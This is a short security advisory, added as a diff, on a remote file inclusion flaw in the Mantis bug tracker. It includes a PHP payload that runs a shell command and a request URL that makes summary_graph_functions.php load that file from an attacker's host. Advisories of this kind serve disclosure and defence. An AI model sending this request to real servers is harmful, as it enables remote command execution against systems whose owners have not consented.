@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/5504/info
+
+Mantis depends on include files to provide some functionality, such as dynamic generation of graphs. However, since Mantis does not properly validate the path to the include file, it is possible for attackers to specify an arbitrary path, either to a local file or a file on a remote server. 
+
+Attackers may use this to include PHP files located on remote servers. Execution of arbitrary commands with the privileges of the webserver is the result of successful exploitation.
+
+The attacker may create the following file (listings.txt) on a server they have access to:
+
+<?php
+system('ls');
+exit;
+?>
+
+And then cause it to be included with the following request:
+
+http://target/mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F
